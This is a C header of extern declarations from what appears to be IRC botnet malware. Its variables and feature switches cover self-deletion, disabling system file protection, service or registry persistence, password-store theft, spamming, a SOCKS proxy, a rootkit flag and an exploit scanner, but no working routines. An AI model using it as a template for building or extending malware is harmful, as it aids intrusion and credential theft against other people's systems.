extern char botid[];
extern char version[];
extern char mutexhandle[];
extern char movepath[];
extern char filename[];
extern char password[];
extern char prefix;
extern char *authost[];
extern int authsize;
extern SERVER servers[];
extern int curserver;
#ifndef NO_VERSION_REPLY
extern int curversion;
char *versionlist[];
#endif

#ifndef NO_MELT
extern REGENT meltkey;
#endif

#ifndef NO_SFCDISABLE
extern char sfc_dllname[];
#endif

#ifndef NO_SERVICE
extern char servicename[];
extern char servicedisplayname[];
extern char servicedesc[];
#else
extern REGENT runkey;
#endif

#ifndef NO_RECORD_UPTIME
extern REGENT rupkey;
#endif

#ifndef NO_INSTALLED_TIME
extern REGENT itkey;
#endif

#ifndef NO_PROCESS
extern char process_title[];
#endif

extern char irc_title[];

#ifndef NO_ADVSCAN
extern char scan_title[];
#endif

#ifndef NO_VISIT
extern char visit_title[];
#endif

#ifndef NO_MIRCCMD
extern char mirc_title[];
#endif

#ifndef NO_FILECTRL
extern char file_title[];
#endif

#ifndef NO_DOWNLOAD
extern char download_title[];
extern char update_title[];
#endif

#ifndef NO_IFELSE
extern char logic_title[];
#endif

#ifndef NO_REGCTRL
extern char reg_title[];
#endif

#ifndef NO_PSTORE
extern char pstore_title[];
#endif


#ifndef NO_SPAMBOT
extern char spambot_title[];
#endif



#ifndef NO_SPY_WARNING
extern char warn_title[];
#endif

extern HANDLE ih;

extern char exip[MAX_IP];
extern char inip[MAX_IP];
extern char host[MAX_HOSTNAME];

extern unsigned short sock4port;

extern DWORD dwstarted;
extern DWORD dwconnected;

extern char main_title[];
extern char threads_title[];

#ifndef NO_SECURE
extern char sec_title[];
extern char unsec_title[];
#endif

extern THREAD threads[MAX_THREADS];

extern char installedt[128];

extern BOOL rkenabled;
extern HANDLE mutex;

// The login command needs extern for protocol.cpp
extern const char cmd_login_1[];

#ifndef NO_ADVSCAN
extern EXPLOIT exploit[];
extern SCANALL scanall[];
extern int scanallsize;
#endif